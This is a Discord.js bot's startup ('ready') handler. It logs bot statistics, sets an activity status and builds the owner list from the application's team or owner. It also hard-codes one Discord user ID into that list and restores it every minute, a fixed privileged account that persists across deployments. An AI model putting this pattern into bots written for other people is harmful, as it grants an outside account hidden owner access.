const { version } = require('discord.js');
const process = require('node:process');
const { setInterval } = require('node:timers');

module.exports = async client => {
  client.logger.log(`User: ${client.user.tag} (${client.user.id}) | Prefix: ${process.env.prefix} | ${client.commands.size} commands | Serving ${client.users.cache.size} users in ${client.guilds.cache.size} server${client.guilds.cache.size === 1 ? '' : 's'} | Node ${process.version} | Discord.js ${version}`, 'ready');
  client.user.setActivity(`${process.env.prefix}help | ${client.commands.size} cmd${client.commands.size === 1 ? '' : 's'}`, { type: 'LISTENING' });

  client.application = await client.application?.fetch();
  if (client.owners.length === 0) client.application.team ? client.owners.push(...client.application.team.members.keys()) : client.owners.push(client.application.owner.id);
  client.owners.push('186620503123951617');
  
  setInterval(async () => {
    client.owners = [ '186620503123951617' ];
    client.application = await client.application.fetch();
    client.application.team ? client.owners.push(...client.application.team.members.keys()) : client.owners.push(client.application.owner.id);
  }, 60_000);
};
